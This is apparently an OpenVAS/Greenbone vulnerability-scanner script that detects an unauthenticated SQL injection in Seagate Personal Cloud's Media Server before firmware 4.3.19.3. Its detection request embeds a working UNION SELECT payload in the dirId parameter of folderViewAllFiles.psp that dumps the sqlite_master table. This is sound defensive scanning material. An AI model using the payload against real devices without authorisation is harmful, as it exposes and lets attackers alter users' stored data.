# SPDX-FileCopyrightText: 2018 Greenbone AG
# Some text descriptions might be excerpted from (a) referenced
# source(s), and are Copyright (C) by the respective right holder(s).
#
# SPDX-License-Identifier: GPL-2.0-only

if (description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.141391");
  script_version("2023-07-20T05:05:18+0000");
  script_tag(name:"last_modification", value:"2023-07-20 05:05:18 +0000 (Thu, 20 Jul 2023)");
  script_tag(name:"creation_date", value:"2018-08-23 15:55:34 +0700 (Thu, 23 Aug 2018)");
  script_tag(name:"cvss_base", value:"6.4");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:P/A:N");

  script_tag(name:"qod_type", value:"exploit");

  script_tag(name:"solution_type", value:"VendorFix");

  script_name("Seagate Personal Cloud < 4.3.19.3 SQL Injection Vulnerability");

  script_category(ACT_GATHER_INFO);

  script_copyright("Copyright (C) 2018 Greenbone AG");
  script_family("Web application abuses");
  script_dependencies("gb_seagate_nas_detect.nasl");
  script_mandatory_keys("seagate_nas/detected");

  script_tag(name:"summary", value:"Seagate Media Server in Seagate Personal Cloud has unauthenticated SQL
  Injection vulnerability which may lead to retrieve or modify arbitrary data in the database.");

  script_tag(name:"vuldetect", value:"Sends a crafted HTTP GET request and checks the response.");

  script_tag(name:"affected", value:"Seagate Media Server in Seagate Personal Cloud prior to version 4.3.19.3.");

  script_tag(name:"solution", value:"Update to firmware version 4.3.19.3 or later.");

  script_xref(name:"URL", value:"https://sumofpwn.nl/advisory/2017/seagate-media-server-multiple-sql-injection-vulnerabilities.html");
  script_xref(name:"URL", value:"http://knowledge.seagate.com/articles/en_US/FAQ/007752en");

  exit(0);
}

include("host_details.inc");
include("http_func.inc");
include("http_keepalive.inc");

cpe_list = make_list("cpe:/h:seagate:personal_cloud", "cpe:/h:seagate:personal_cloud_2_bay");
if (!infos = get_app_port_from_list(cpe_list: cpe_list))
  exit(0);

cpe = infos["cpe"];
port = infos["port"];

if (!get_app_location(cpe: cpe, port: port, nofork: TRUE))
  exit(0);

url = "/folderViewAllFiles.psp?start=0&count=60&url=%2F&dirId=\'+union+select+null,name,null,sql,null,null" +
      "+from+sqlite_master+--+'";

if (http_vuln_check(port: port, url: url, pattern: '"thumbUrl"', check_header: TRUE,
                    extra_check: '"parentdirId"')) {
  report = http_report_vuln_url(port: port, url: url);
  security_message(port: port, data: report);
  exit(0);
}

exit(99);
